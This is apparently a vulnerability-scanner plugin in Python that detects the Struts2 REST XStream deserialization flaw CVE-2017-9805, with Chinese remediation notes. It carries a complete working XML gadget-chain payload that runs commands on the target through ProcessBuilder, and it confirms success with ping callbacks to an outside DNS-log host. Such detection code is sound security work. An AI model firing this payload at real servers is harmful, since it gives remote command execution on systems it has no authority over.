#!/usr/bin/python
# -*- coding: utf-8 -*-

from re import search as re_search
from urllib import quote

import requests

from engine.engine_utils.common import *
from urlparse import urlparse
from engine.logger import scanLogger as logger
import random
import string
'''
CVE-2017-9805
CNNVD-201706-914
Struts2 REST 插件使用带有 XStream 程序的 XStream Handler 进行未经任何代码过滤的反序列化操作，这可能在反序列化XML payloads时导致远程代码执行。
任意攻击者都可以构造恶意的XML内容提升权限。

1.建议尽快升级到 2.5.13或更高版本。
2.在不使用时删除 Struts REST插件，或仅限于服务器普通页面和JSONs：
<constant name=”struts.action.extension” value=”xhtml,,json” />
3.限制服务器端扩展类型，删除XML支持。
'''

def run_url(http, ob, item):
    result = []
    try:
        method = item['method']
        if 'POST' != method.upper():
            return result
        domain = ob['domain']
        header = {'Host': domain, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                  'Content-Type': 'application/xml', 'Upgrade-Insecure-Requests': '1'}
        source_ip = ob.get('source_ip')
        url = item['url']
        url = url.split('?')[0]
        url_parse = urlparse(url)
        scheme = url_parse.scheme
        domain = url_parse.netloc
        path = url_parse.path
        query = url_parse.query

        if source_ip:
            domain = source_ip
        if query:
            url = "%s://%s%s?%s" % (scheme, domain, path, query)
        else:
            url = "%s://%s%s" % (scheme, domain, path)

        # 原始恶意请求，在发送请求之前会做urlencode
        original_payload = """<map><entry><jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> <is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"> <command>%s</command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/></entry></map>"""
        payload_list = []
        random_str, ping_cmd_list = _cmd_poc()
        for ping_cmd in ping_cmd_list:
            payload = original_payload % ping_cmd
            payload_list.append(payload)

        for inj_value in payload_list:
            res, content = http.request(url, 'POST', body=inj_value, headers=header)
            if callback(random_str):
                detail = "检测到Struts2远程命令执行漏洞"
                request = postRequest(url, headers=header, body=inj_value)
                response = getResponse(res, content)
                result.append(getRecord(ob, url, ob['level'], detail, request, response))
                break

    except Exception, e:
        logger.error("File:Struts2_S2_052Script_yd.py, run_url function :%s" % (str(e)))

    return result


# 生产随机子域名
def _cmd_poc():
    dns_log_domain = "test.cloudflarepro.com"
    random_str = ''.join(random.sample(string.ascii_letters + string.digits, 17))
    random_domain = random_str + '.' + dns_log_domain
    # if 'Windows' == platform.system():
    #     ping_cmd = 'ping -n 3 {}'.format(random_domain)
    # else:
    ping_linux = '<string>ping</string><string>-c</string><string>3</string><string>{}</string>'.format(random_domain)
    ping_win = '<string>ping</string><string>-n</string><string>3</string><string>{}</string>'.format(random_domain)
    return random_str, [ping_linux, ping_win]


def callback(random_str):
    api = 'http://admin.cloudflarepro.com/api/dns/test/{}/'
    r = requests.get(api.format(random_str))
    res = r.text
    return True if 'True' == res else False
